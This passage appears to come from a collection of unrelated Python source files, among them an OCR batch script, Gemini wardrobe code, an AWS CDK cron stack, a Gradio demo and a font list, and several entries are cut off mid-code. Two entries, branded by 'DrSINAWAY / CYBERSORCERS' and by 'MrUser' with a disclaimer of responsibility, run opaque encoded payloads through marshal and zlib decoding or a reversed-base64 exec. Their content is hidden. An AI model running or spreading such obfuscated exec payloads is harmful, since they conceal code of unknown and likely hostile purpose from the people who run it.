help=\"Path to the configuration file\")\n    parser.add_argument(\"--input\", type=str, help=\"Path to the input directory\")\n    parser.add_argument(\"--output\", type=str, help=\"Path to the output directory\")\n    args = parser.parse_args()\n\n    # Read config\n    config = configparser.ConfigParser()\n\n    if args.config:\n        if os.path.exists(args.config):\n            config.read(args.config)\n        else:\n            print(\"Specified config file not found.\")\n            return\n    else:\n        if os.path.exists(\"config.cfg\"):\n            config.read(\"config.cfg\")\n        else:\n            print(\"Default config file 'config.cfg' not found.\")\n            return\n\n    try:\n        input_directory = args.input if args.input else config[\"Files\"][\"input\"]\n        output_directory = args.output if args.output else config[\"Files\"][\"output\"]\n        ocr_settings = parse_settings(config.items(\"OCR\"))\n    except Exception as e:\n        print(\n            \"Something went wrong! Ensure the configuration file has a 'Files' and 'OCR' section. 'input' and 'output' field under 'Files' and 'Text', 'Loc' under 'OCR'\"\n        )\n        logging.error(str(e) + \" not present\")\n        return\n\n    files = []\n    for file in os.listdir(input_directory):\n        if file.endswith(\".pdf\"):\n            files.append(file)\n    with ThreadPoolExecutor() as procs:\n        procs.map(process_file, files)\n\n\nif __name__ == \"__main__\":\n    print(\"Welcome!\")\n    print(\"Please wait, while the program processes the configuration file\")\n    main()\n    input(\"Press Enter to exit\")\n",
    "from gemini import websearch, wardrobe_integrated\nimport argparse\nimport requests\nimport google.generativeai as genai\n\nimport PIL\nfrom PIL import Image\n#import PIL.Image\nimport os\nimport json\n\nimport sqlite3\n\ngenai.configure(api_key=os.environ['OPENAI_API_KEY'])\n\n# def parse_json(input_json):\n#     opening_brace_index = input_json.find('{')\n#     closing_brace_index = input_json.rfind('}')\n#     print(len(input_json))\n#     print(closing_brace_index)\n#     input_json = input_json[opening_brace_index:closing_brace_index + 1]\n#     print(input_json)\n#     output = json.loads(input_json)\n#     for x in output[\"suggestedItems\"]:\n#         print(x)\n#     return output\n\n# def wardrobe_integrated(query, folder='test_images_16/'):\n#     num_input_images = 16\n#     # outputs both images and text description\n#     # hard-coding input images for now\n#     # Install the Python SDK\n#     # a = !ls '/content/drive/MyDrive/mhacksxgoogle/images_compressed/'\n#     # folder = 'test_images_16/' #currently hardcoded\n#     i=0\n#     imgs = []\n\n#     #img_address_dict = {}\n#     for file in os.listdir(folder):\n#         if(i<num_input_images):\n#             #img = PIL.Image.open(f'{folder}{file}')\n#             #print(f'{folder}{file}')\n#             img = Image.open(f'{folder}{file}')\n#             #img_address_dict[file] = img\n#             imgs.append(img)\n#             # print(img)\n#             # print(imgs[i])\n#             # print(img.filename)\n#             i=i+1\n#             if(i==num_input_images):\n#                 break\n\n#     #print(img_address_dict['denimjeans.jpg'])\n            \n#     labelled_images={}\n#     img_labelling_instruction = \"You are an image-labeller. I will provide you images of various items of clothing one-by-one and want you to label each image with a string of upto 3 words (no commas). Give me no output besides this label. Include no commas\"\n#     img_labelling_model = genai.GenerativeModel('gemini-pro-vision')\n\n#     print(len(imgs))\n\n#     for i in range(num_input_images):\n#         response = img_labelling_model.generate_content([img_labelling_instruction, imgs[i]])\n#         #print(response.text)\n#         a = response.text\n#         b =a.strip()\n#         labelled_images[b] = imgs[i]\n\n#     print(\"labels successfully generated\")\n\n#     flattened_dict = []\n#     for i in labelled_images.keys():\n#         flattened_dict.append(i)\n#         flattened_dict.append(labelled_images[i])\n\n#     labelled_images_16 = list(labelled_images.keys())[0:num_input_images]\n#     flattened_dict_32 = flattened_dict[0:num_input_images*2]\n\n#     fashion_prompt_2 = \"\"\"Return all responses in JSON format, the JSON should include an array of items (suggested items) and a parameter that explains the overall outfit. ONLY RETURN ONE SET OF CURLY BRACES IN THE JSON.\n#         Example JSON: [{\"suggestedItems\":[\"red hat\", \"flare pants\", \"cowboy boots\"],\n#             \"outfitParameter\": \"This outfit contains a red hat and flare pants. It will look great on you!\"\n#             }] You are my best friend and a fashion expert. %s I have attached pictures of various items from my wardrobe. Could you put together a suitable outfit for me, using only the images provided?\n#         Input format: (item description 1, image 1, item description 2, image 2, ... item description n, image n). Please only use exactly 3 outputs from the following list for suggestedItems: %s\"\"\" % (query, labelled_images_16)\n\n#     fashion_model_2 = genai.GenerativeModel('gemini-pro-vision')\n#     response = fashion_model_2.generate_content([fashion_prompt_2, *flattened_dict_32])\n\n    \n#     #helper function for wardrobe_image function\n#     def print_images(a: str):\n#         #b=a.split(', ')\n#         #print(b)\n#         #type(b)\n#         for i in a:\n#             try:\n#                 i = i.strip()\n#                 #print(i)\n#                 #print(labelled_images[i])\n#                 result_images.append(labelled_images[i].filename)\n#             except:\n#                 pass\n\n#     a = parse_json(response.text.strip())\n#     #print(type(a))\n#     #print(a)\n#     #json_object = json.loads(response.text.strip())\n#     #  print(type(json_object[\"suggestedItems\"]))\n\n#     result_images = []\n#     #print(response.text.strip())\n#     #print(\"\\n\\n\")\n#     #print(type(json_object))\n#     #print(len(json_object))\n#     #print(json_object)\n#     print_images(a[\"suggestedItems\"])\n#     #print(\"\\n\\n\\n\")\n#     #print(a[\"suggestedItems\"])\n#     #print(\"\\n\\n\\n\")\n#     #print(a[\"outfitParameter\"])\n#     #print_images(json_object[\"suggestedItems\"])\n\n#     #print(json_object[\"outfitParameter\"])\n\n#     # this will print the word output\n#     # result_images is a list of jpg images that should be displayed to user\n#     #print(result_images)\n\n#     output_dictionary = {}\n#     output_dictionary[\"message\"] = a[\"outfitParameter\"]\n#     z=0\n#     for i in result_images:\n#         output_dictionary[z]=i\n#         z=z+1\n\n#     return output_dictionary\n\n\ndef trigger_funct",
    "#<!--Created By DrSINAWAY-->\r\n#<!--Telegram @CYBERSORCERS-->\r\n#<!--Telegram @Drsinaway-->\r\n#<!--instgram @Dr.sinaway-->\r\n#<!--GITHUB=GITHUB/CYBERSORCERSS-->\r\n#<!--website=https://drsinawy.com-->\r\n#<!--website=https://drsinaway.online--> \r\n_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b16decode('FE60C2816FFF12E21FF7FFCBF87E7C8F137D578A3FC3F3E42E30FF91E0CB8FDFDEFEBE8FE1FF5FC3FBDFD7C1FF0FD5F91E2F7F7BFAFC3F0FC57C9FCFFCF3E20FE6FCBE77E5FD5F57D5FBBF2FEBFC17FC9DE5FA5FECFDEFF1F9BE8FFA3FA7E4FC9DC5FE59FECFD0F3CFF67E5FF7FC1FF1FD3FF8FC6FC5FEBEAF8BF3BE77E77FC47DFB1FE5F27F3FF37E20FC2FF6FC3FF57E3F7FADFED78EBF73C48FEBFBBFC3FEBFFBF7BFAFDDFF8F2FFDBF3FFBDFD7CEFF57C6FF2F97D1FEF7F5FDBFD5FFBF97CBF2FF0FFF7D9FE1FFEF8BFFDFFDFE7FFBFFBF4FEF7FADFF5FFD5FE5FFEDFEEFD9FF6FF77E2FEF7F77FCFEF7F77F4FF8FFA7FFF7E3FF9BFEDFB3FCDFF6FC5FC6FFB7FCFE37FDBFA7F19BFEB7F0FF2F93FAFF21FFCFCBE5FC725F8BEE7FB3F7BF07E8FE1F93F07E6FF5FFD7F27FB3FF8FED7F9BE6FCEA95ADFD9FC1E53F37DEFE3C5FE4FF2BFEF9B7EE7FAFEBE77C5FABE77F8FD1FD7F5530FCCFF17FCFF9FE3F67F8FE4FE9F83FE3F47EB7E2FF9FA3F07F4FCDF9BF17FAFEBE0FF67F4FF1FC9FA3FEBFAFADF8BF1BF3BF7FE2FFE3FFEB405CD3747C88A1B8FEEDFB06156CFD9BF0E72E606070E685BF44C99F642EF833891470E7B3B08444F048EC41DD853AB6173B2B87F2564443972E63DD449D39E7ABEA7CE47B1CE84D949739F65631EDF3B092D0F9BF29D21D79F40D1624A3EC3A3EDC6E1E0CE3D4C15F3131FE8737E15EE8314F6F4507A4EDD96E2EF791A875F8D0F7E06BD9CEF66B78B5AF65F1BCD8B7C793E77418E2AE5C6C83BFDB6E5F556DC4B94C55715FCE225DF96C19B3B863CE940CA6DCCB39FC674932FD20111FEDF1CFE4359198A5F1FB8BF0428AAEDE0C30BF60F9FDFAC2733316627AF4FE5755397B1FB515587BC0FCFC6288FF0F4B61B84EBFDE341A4EEDEE019B821DF98E6C57DAEF4467530ECBFC28C5C5A633ADBF00A8E5AEDFAF5639C6C118937ED86F2FC9656153A9CC7C8BA846B6F8D222F8ACBF363400334C0B84BF9AE791111022E6B83CB426D86BB197E5809057EA889D7907485AAE403AFF790B657824683F659185389B949F2DBA60EDBF95910CEB7A66D5C3D7E385ADDC88E4717C4D777E7DB989EC27B0CD977E4FABDD594B1A4CEC2A98E8F4FAA6D8E16227984318BBEBC0E66BB62F1EBB63884C56074DC676F8E7422DA519F12420D41B2CFD56E8A66CF7C77C403A8057ECACA48737A8FA09D5571237A7E00F2AF0B8E73140B18FBC6522BCA84FA530FC9A9156E69618D0E4DD9C7AF4136F71E587F0474F37D0C5CCBB38008EDF87382881EBD64507672EF0C6909BDF765C53D2607E01012359F61F70681E3A790EDFBBBF6B02C53C782434FB18D28469DB7ECD7640819F217C60C0268D7DC21D0AB560C5882DBAEA103D33CF307A72585F14FAC59A38960EC0D32CC357ED94B2EB86E36B199C0DB77E2CD3CB76BF7F40E1A98626DE9E1305F935CA483C3A21BB97286BB1DFCF2E4E205BAC79C93420BC011DB26ADD6E1BC668FD9072A3AC623AF1AF2C0EDC637B4D50A84A17EF863BD8E3CD72EE9A0D37EDCE8A735B0EE9EB9C6731B9845707872C6DB67F5A2B418B136534C733AC7DC4229CDF876E93721232B4D84AA0341054377D59A73ED8EA11D0759900364583D397DA48FEF9CFC02AFC3CAAF1A3C758442CC75BD68CE3F3DC394A779872D611D3FC35C7027C347771A1D64A9899B196713D8D0F3DF6CB7BB5FBABDCAED55B3D8F66298AC2637E1A70ACF5F234677CE370A41B1671F105220151383F17F62B2C11942F6FC373552AA393EAD4C431E8B3B467399269B0417C54FC05596CF84C72006FCB3F3DABF9564471ACB0F9DBFD6547DA7E4F2CB06D396F921CAE71EB661F57EC3DF7EE67F0E226089A67D74AF9DFD9B37F0209049E4D87ED317C87888541CD93184B057EBC8841696D3AE32C16A4734AC36FA519F00BA463A54271DFEC7E0286C41CB348389B78B96F421B65BA0474F9C2715C429873BB83DB87AF13988A98BB2E9D11C3A2468A1CED9EBF1BCEFD1C1163B67041D0B40F604BD13CD4ACCE49FC2FDB1BE07CA308E93BE640C4824140AE9B01E1159661168245929F2B998839EFF8208FEF8D0DE8AD71BEB8B8BB60108B56200BF1D74DDE270C1D657A199A0894F75291AB1B7D024D1EEF29D7C06E9BC03A7E10E89EB5AC6EFC6521256FB7789AB3D491F44FDF67A6B635689E51947904517596B15B0DBF0F14F69F30C1D48C55405F20788E3BA09596647A24306575ED321E5A835C2171EC3B4697E9A457F38F71CD99C808F992784B1E9C737A5FB550E2A0731DB32919E775B10C2DAE84B2CD85634ED6CD3EEE779B68002427924303855072B1448E1CF90C1CDC24F9DBEC30E597291BFED1DC7B4144ECD406DF11F40473232E699702138E76EFC6CC3D8C965C9800116A24E5F8A0F6FADC0692FD3D191D5CC8B756D3DE0994896944F39FBDC681331A2879654043791FE10E012D4365C48F7229FD498A4804001324E67604F739B388B04277E3D959E16089C51503A64062BF13CA6D43CB614A23D4E5F454C0764314AE57DD9F9B1CE35B0A31705FCC19C8F2CCCBAC7CEAE3CED43EDB69CB91EDF51F8618969F6A072F5993178613B0F6EB1671402B6799C7BEE18EE90F9EFE5B573A73A4D119CF050677E4AA15BB3C805EDB5B606656CDBF2EE50ECB1EB3B698A4DDA7C0CB1DF91CDE0A637E5D6C856DD2AA679F0C8DE42C3FC5B4B8F5E27EBED873DE5F8CFCF78B1464BBB8771A95D15F3F5CFB3F6CF2F7B834874776C5C4BA0A97EDB386036A92D46DBC9F5364C667572D4C041388B4CB47A235F19CE5D79ED19D629718481EF275B38E9D09ED02E44FF009ECC585B1A588DD62B2B64FC9DAE9F4C3818BA171F65B80B79AC9AB423CF49E2F0CD0AA7B7BD67906353589E2D1F2D55FA75AA3D3D85B1E9B598AF922C420BF7FB8EA0B9CE1BB3DB835CBA8C4EDB101503440E06335C8A77C460074E45BA98A3979B485AD7BE3BB7C70C30EBC6BD8C8D11512BA1D3B06965821CD9CEE506F09A823882F7C6BF0047DCE160372239B066BB1EBD09DB4F93C074EFBB461EDDC8186D3A3B4F47E99293C23649FEE56137EB441D88BA3BE4DDB60CE18123177C9C6D96DEEADC3DC466B971F57B5934A1C4E3CB720371800038F8E988E462802CE2F352F6323BD5333AC38F687A03C7AE17EB889FB88DC4388ADE2F10FF8AE7277678A9B251CE2645F8B7E1E6076C7F35935C95A2356B50A9982C4B5519284491EB839F41CBE346D98D6DC99ADE0987A5C9107AFC8F1F683B4DCA2DFF",
    "#===========================\n#Coded by MrUser\n#Made in Madagascar\n#Please follow my github channel\n#I am not responsible for what you will do with this tools\n#===========================\n_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'pkyJahFaslVen9GW5t2bZlGZ3F2MstUWXh2RZhlTzZVbWV3TVRGWOhVU5lFbwNnUx8meSpmSON2MSZlVxg2bNxmShF2R4VVZsB3VZxGZX1UMSdVVrRGWUJDaXZFVWNnUtp0MUxGaVN2MShFVW5UYSxGcQVlaG5kYw8meWxGbL10VONXZHFDVXVVNHlFbONkVsJFSlRkSXZ1VSdUWwg2RSJjSydlaCplUxA3RZZFarZlVVBzYFp1UZVVN1ZFWONlUyYkVNZFZPdlRKRXVuRWYWxGZ1QWMkpVYFpVcW1WOh10VGJHVsp1VlVkR1lVMkBjUyY0MTdFeOZlModlVY50SSxmVV10VxY1VHh3cZZlSHZlRsRzUVpFWXhEa0ZlbGFmYHZFWhZkVYZVb4V1VW5EMWBDM3JWMa5UYyI1RXtGZ3ZlVOhVTVRmajxGczZFbaNUZspFMhVEaoZVVwVlVUpVYNdlRyRVb4plVxoEWZFTW4JlMSVFVtFzVkBTN1ZVMaNVTsZVWX1GdYVWRWhUVrR3UiZkWzIWMapmVrpVcW5mShZVbKtUUtBHWSNjQXdlVORjUy4EWjdEeTllVKFnVYhmQXdkVVN2RxM1VGp0cURlUXJGbaplTUJkVhZFczZlVotUTXZEVjZEZhNGMJpXVsZ1aStGO4dlVa5UVxoUcXhFZ2J2RGhVVtR3UTdFeXR1V0dkYWx2RStmUXZFWohUWWx2TidlVYd1aWd1VHdWeV1Ga0ImVkZjTFZ1URJjUXZVRotUTWpEWOdVMV1keGJnVrR3ciZkUZJlbwZVYGplRZpnQXZVbKhUVtB3VWNjQXp1VoNVYx4UWXxmWOl1VSZlVzgmUN1mRwdVb0hVZVB3VZ5Ga2JmRWRjYwY1aWhFaIdVbotkYWpkciRkRWRWRaVUWtB3RSdkT1cVb4lmVwoFWWZEa3JlVaRVTVRmaWtmWIV1aatmYspVMhdUMVRFbwdUWqJVYidkRER2RxcVZrx2RVFzZxImVk10UtFzVZhlQZdVVkFWTWplcW1GdYJFbwNHVXVzRhxmV1YFVCt2VIhGdWBTOzZFbZhnVXVzVkhVQ3VVbnhnYWJFWNZlVXF2MohlVxo1QNFjSWVVb4JVZVBHSZ1GdrFWMaFTUrhGaWtGcxZFWwFmYGpFaUxmWVdlRwZUWVlTYiZkWXdlaG5kYxoUSW5mTTJFM1A3VrpVYlRlQWZFbkNnVxQmVlVEZYdFSSRnVxIVYWtWM6RFboV1VFpVcWxGarJ1VWZjYHh3VUxmWVdFWoZnYHZVVkdUMYRVMwNXWr50UixmWKdFbWpFVsB3cWpnRHJVMKBlWHh3VWBjS1lVMaRjUxAXRXxmWTV2R4gnVYZ0dNZkVPFmRWJlTGB3VW1GdrJGbal1UrpFWZZlWyZlbCdkVxoEahVkWXZVb4ZjVthGNiZFZzIVVkNFVyI1cW5mVLJVbShlUtBHWhZEcHl1a0t0UGpFMW5GcXFmbSRnV6pkcS1mSUFVbwplVxA3VadlRhFWMkVVVrRmTNdFdzZlbwpUTWp1cNdVMVdVbSdVWqJ0bWxmUGNVb0dlVuhGSXpmQaZ1axoXYGplVjRlVyllVktkUHZUSiVkWO50RkVnVWh2dNZkTTR2RxY1VFRTeUVlTrFWMaRjW6p0VU1mUWV1MkpWTXZEaidUMaNmbCdVWxgWYNZFb0c1V4dVWXdHeXVFaHVGbWh1VrZlalxmSzZ1azVjVxIFNipnRXFmRKJXVxI1RSFjT2VVb1cVZuNWeWZFZHFGbOVDVrR2UTJjUzZFWwZUTHJ1VlVEZhRVRvhXVs50RiZEZJFGROZlVrBXRZZFZr10VGJHVthnVldEO4lFbnhnUyIlVW1WMXRWbollVuZUYidkRvJVbwdVTEJlVVxGZPJmRaFTYFRGVXxGcHllVCtUTspFTW1WNaNlRaZjVsR2dixmWIV1aalGVyIlcWV1Z4Z1VWFlVtR3VWVkWzRlVOtmYGp1RhRkSURFbwNnVxA3VWFjSyFmRkF2YuJ0RVFDcwIlMSl3UtFzUWBjWVZFWSdlUGRmVStmUqJlM4dEVXlzTiZkV6NWRaR1VEZEWUxGZP10axQkWHRHWWJzZ5p1RsFmYGpkWWtmWplFVWZ0VuRmQXdkUY5UVkpWZsx2VUhlTTJFbwhUVtFTVhVVNxVFWwdlUtpkcadEdWVWRGlUVxkEeWBTNVdVb4xmUxoUWW5mV31kRO90VthHWXZFcHlVbGdlYGpleRpmTXdFbwNnVVh3RSJjSYJGRGd1YWBncWZEZPFGbVd3VrpFWhFDcWdlbSdnUWplcaZkVOZFM1QXVtZ0bWZFZx4EVCVVYYhGdWpXWxIlVaRkYFR2VjBTS6lVMkNkUHpUSTpmSTJFMKdkVuZUYNZkWyp1R0Z1U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",
    "from aws_cdk import (\n    aws_events as events,\n    aws_lambda,\n    aws_lambda_python_alpha as py_lambda,\n    aws_events_targets as targets,\n    App, Duration, Stack\n)\n\n\nclass LambdaCronStack(Stack):\n    def __init__(self, app: App, id: str) -> None:\n        super().__init__(app, id)\n\n        lambdaFn = py_lambda.PythonFunction(\n            self, \"rss-lambda\",\n            entry=\"rss_lambda\",\n            runtime=aws_lambda.Runtime.PYTHON_3_12,\n            index=\"rss_lambda.py\",\n            handler=\"main\",\n            timeout=Duration.seconds(300),\n        )\n\n        # Run every five minutes\n        # See https://docs.aws.amazon.com/lambda/latest/dg/tutorial-scheduled-events-schedule-expressions.html\n        rule = events.Rule(\n            self, \"Rule\",\n            schedule=events.Schedule.cron(\n                minute='*/5',\n                hour='*',\n                month='*',\n                week_day='*',\n                year='*'),\n        )\n        rule.add_target(targets.LambdaFunction(lambdaFn))\n\n\napp = App()\nLambdaCronStack(app, \"LambdaCronExample\")\napp.synth()\n",
    "import os\nimport sys\n\nimport gradio as gr\n\nsys.path.append(\"../CTM/\")\nfrom ctm.ctms.ctm_base import BaseConsciousnessTuringMachine\n\nctm = BaseConsciousnessTuringMachine()\nctm.add_supervisor(\"gpt4_supervisor\")\n\nDEPLOYED = os.getenv(\"DEPLOYED\", \"true\").lower() == \"true\"\n\n\ndef introduction():\n    with gr.Column(scale=2):\n        gr.Image(\n            \"images/sotopia.jpg\", elem_id=\"banner-image\", show_label=False\n        )\n    with gr.Column(scale=5):\n        gr.Markdown(\n            \"\"\"Consciousness Turing Machine Demo\n            \"\"\"\n        )\n\n\ndef add_processor(processor_name, display_name, state):\n    print(\"add processor \", processor_name)\n    ctm.add_processor(processor_name)\n    print(len(ctm.processor_list))\n    return display_name + \" (added)\"\n\n\ndef processor_tab():\n    # Categorized model names\n    text_processors = [\n        \"gpt4_text_emotion_processor\",\n        \"gpt4_text_summary_processor\",\n        \"gpt4_speaker_intent_processor\",\n        \"roberta_text_sentiment_processor\",\n    ]\n    vision_processors = [\n        \"gpt4v_cloth_fashion_processor\",\n        \"gpt4v_face_emotion_processor\",\n        \"gpt4v_ocr_processor\",\n        \"gpt4v_posture\",\n        \"gpt4v_scene_location_processor\",\n    ]\n\n    with gr.Blocks():\n        with gr.Row():\n            with gr.Column(scale=1):\n                gr.Markdown(\"### Text Processors\")\n                for model_name in text_processors:\n                    display_name = (\n                        model_name.replace(\"processor\", \"\")\n                        .replace(\"_\", \" \")\n                        .title()\n                    )\n\n                    button = gr.Button(display_name)\n                    processor_name = gr.Textbox(\n                        value=model_name, visible=False\n                    )\n                    display_name = gr.Textbox(\n                        value=display_name, visible=False\n                    )\n                    button.click(\n                        fn=add_processor,\n                        inputs=[processor_name, display_name, gr.State()],\n                        outputs=[button],\n                    )\n\n            with gr.Column(scale=1):\n                gr.Markdown(\"### Vision Processors\")\n                for model_name in vision_processors:\n                    display_name = (\n                        model_name.replace(\"processor\", \"\")\n                        .replace(\"_\", \" \")\n                        .title()\n                    )\n\n                    button = gr.Button(display_name)\n                    processor_name = gr.Textbox(\n                        value=model_name, visible=False\n                    )\n                    display_name = gr.Textbox(\n                        value=display_name, visible=False\n                    )\n                    button.click(\n                        fn=add_processor,\n                        inputs=[processor_name, display_name, gr.State()],\n                        outputs=[button],\n                    )\n\n\ndef forward(query, content, image, state):\n    state[\"question\"] = query\n    ask_processors_output_info, state = ask_processors(\n        query, content, image, state\n    )\n    uptree_competition_output_info, state = uptree_competition(state)\n    ask_supervisor_output_info, state = ask_supervisor(state)\n\n    ctm.downtree_broadcast(state[\"winning_output\"])\n    ctm.link_form(state[\"processor_output\"])\n    return (\n        ask_processors_output_info,\n        uptree_competition_output_info,\n        ask_supervisor_output_info,\n        state,\n    )\n\n\ndef ask_processors(query, content, image, state):\n    # Simulate processing here\n    processor_output = ctm.ask_processors(\n        question=query,\n        context=content,\n        image_path=None,\n        audio_path=None,\n        video_path=None,\n    )\n    output_info = \"\"\n    for name, info in processor_output.items():\n        output_info += f\"{name}: {info['gist']}\\n\"\n    state[\"processor_output\"] = processor_output\n    return output_info, state\n\n\ndef uptree_competition(state):\n    winning_output = ctm.uptree_competition(state[\"processor_output\"])\n    state[\"winning_output\"] = winning_output\n    output_info = (\n        \"The winning processor is: {}\\nThe winning gist is: {}\\n\".format(\n            winning_output[\"name\"], winning_output[\"gist\"]\n        )\n    )\n    return output_info, state\n\n\ndef ask_supervisor(state):\n    question = state[\"question\"]\n    winning_output = state[\"winning_output\"]\n    answer, score = ctm.ask_supervisor(question, winning_output)\n    output_info = f'The answer to the query \"{question}\" is: {answer}\\nThe confidence for answering is: {score}\\n'\n    state[\"answer\"] = answer\n    state[\"score\"] = score\n    return output_info, state\n\n\ndef interface_tab():\n    with gr.Blocks() as interface_tab:\n        state = gr.State({})  # State to hold and pass values\n\n        with gr.Column():\n            # Inputs\n            content = gr.Textbox(label=\"Enter your text here\")\n            query = gr.Textbox(label=\"Enter your query he",
    "COLORS = ['red','green','yellow','blue','magenta','cyan','light_cyan',\n'light_magenta','light_blue','light_yellow','light_green','light_red']\n\nFONTS = ['3-d', '3x5', '5lineoblique', 'acrobatic', 'alligator', 'alligator2', 'alphabet',\n'avatar', 'banner', 'banner3-D', 'banner3', 'banner4', 'barbwire', 'basic', 'bell', 'big',\n'bigchief', 'binary', 'block', 'bubble', 'bulbhead', 'calgphy2', 'caligraphy', 'catwalk',\n'chunky', 'coinstak', 'colossal', 'computer', 'contessa', 'contrast', 'cosmic', 'cosmike',\n'cricket', 'cyberlarge', 'cybermedium', 'cybersmall', 'diamond', 'digital', 'doh', 'doom', \n'dotmatrix', 'drpepper', 'eftichess', 'eftifont', 'eftipiti', 'eftirobot', 'eftitalic',\n'eftiwall', 'eftiwater', 'epic', 'fender', 'fourtops', 'fuzzy', 'goofy', 'gothic', 'graffiti', \n'hollywood', 'invita', 'isometric1', 'isometric2', 'isometric3', 'isometric4', 'italic',\n'ivrit', 'jazmine', 'jerusalem', 'katakana', 'kban', 'larry3d', 'lcd', 'lean', 'letters',\n'linux', 'lockergnome', 'madrid', 'marquee', 'maxfour', 'mike', 'mini', 'mirror', 'mnemonic',\n'morse', 'moscow', 'nancyj-fancy', 'nancyj-underlined', 'nancyj', 'nipples', 'ntgreek', 'o8', \n'ogre', 'pawp', 'peaks', 'pebbles', 'pepper', 'poison', 'puffy', 'pyramid', 'rectangles', \n'relief', 'relief2', 'rev', 'roman', 'rot13', 'rounded', 'rowancap', 'rozzo', 'runic', \n'runyc', 'sblood', 'script', 'serifcap', 'shadow', 'short', 'slant', 'slide', 'slscript', \n'small', 'smisome1', 'smkeyboard', 'smscript', 'smshadow', 'smslant', 'smtengwar', 'speed',\n'stampatello', 'standard', 'starwars', 'stellar', 'stop', 'straight', 'tanja', 'tengwar', \n'term', 'thick', 'thin', 'threepoint', 'ticks', 'ticksslant', 'tinker-toy', 'tombstone', \n'trek', 'tsalagi', 'twopoint', 'univers', 'usaflag', 'weird']\n",
